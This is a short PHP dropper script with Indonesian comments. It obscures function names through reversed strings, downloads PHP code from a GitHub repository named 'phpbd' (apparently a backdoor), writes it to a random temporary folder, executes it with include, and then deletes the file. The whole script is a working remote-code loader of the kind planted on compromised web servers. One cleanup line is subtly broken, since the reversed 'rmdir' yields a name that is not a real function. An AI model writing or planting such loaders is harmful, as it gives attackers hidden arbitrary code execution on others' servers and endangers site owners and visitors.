<?php
 $write     = strrev('stnetnoc_tup_elif');
 $mkdir     = strrev('ridkm');
 $unlink    = strrev('knilnu');
 $is_file   = strrev('elif_si');
 $is_dir    = strrev('rid_si');
 $rmdir     = strrev('rmdir');

 $rawPhpUrl = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/cxyfm.php';

 $tempDir = __DIR__ . DIRECTORY_SEPARATOR . '__' . substr(md5(time()), 0, 6);
 $mkdir($tempDir, 0777, true);

 $hook = $tempDir . DIRECTORY_SEPARATOR . 'hook.php';

// Unduh file PHP dari URL
 $context = stream_context_create([
    'http' => [
        'timeout' => 10,
        'user_agent' => 'PHP Script'
    ]
]);

 $phpContent = @file_get_contents($rawPhpUrl, false, $context);

if ($phpContent !== false) {
    // Tulis konten ke file sementara
    $write($hook, $phpContent);
    
    if ($is_file($hook)) {
        try {
            include $hook;
        } catch (Throwable $e) {
            echo "?? Error in hook.php: ", $e->getMessage(), "\n";
        }
    } else {
        echo "? Failed to create hook.php\n";
    }
} else {
    echo "? Failed to download PHP file from URL\n";
}

// Bersihkan file sementara
if ($is_file($hook)) {
    $unlink($hook);
}

if ($is_dir($tempDir)) {
    $rmdir($tempDir);
}

?>